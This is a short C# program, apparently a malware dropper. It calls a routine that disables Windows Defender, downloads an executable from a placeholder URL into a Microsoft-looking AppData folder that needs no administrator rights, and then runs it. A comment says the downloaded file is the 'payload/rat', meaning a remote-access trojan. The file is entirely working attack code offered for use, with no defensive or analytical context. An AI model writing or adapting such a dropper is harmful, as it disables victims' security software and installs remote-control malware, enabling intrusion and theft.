using System;
using System.Windows.Forms;
using WindowsDefender_Downloader;

namespace DisableDefender_DownloadFile
{
    static class Program
    {
        static void Main()
        {
            //disable windows defender & download the payload/rat
            Disabledefender.Run();
            Delay(1000);
            string URL = "https://somedownloadlink.com/someexename.exe"; //DIRECT DOWNLOAD LINK
            string FILE = @"C:\Users\" + Environment.UserName + @"\AppData\Roaming\Microsoft\Windows\FILE.exe"; // SAVE AS EXE // PATH DOESN'T REQUIRE ADMINISTRATOR RIGHTS
            Download downloadasync = new Download();
            downloadasync.DownloadFile(URL, FILE);

            // start the file
            System.Diagnostics.Process.Start(@"C:\Users\" + Environment.UserName + @"\AppData\Roaming\Microsoft\Windows\FILE.exe"); // STARTING EXE // PATH DOESN'T REQUIRE ADMINISTRATOR RIGHTS
        }

        public static void Delay(int milliseconds)
        {
            System.Windows.Forms.Timer timer1 = new System.Windows.Forms.Timer();
            if (milliseconds == 0 || milliseconds < 0) return;
            timer1.Interval = milliseconds;
            timer1.Enabled = true;
            timer1.Start();
            timer1.Tick += (s, e) =>
            {
                timer1.Enabled = false;
                timer1.Stop();
            };
            while (timer1.Enabled)
            {
                Application.DoEvents();
            }
        }
    }
}
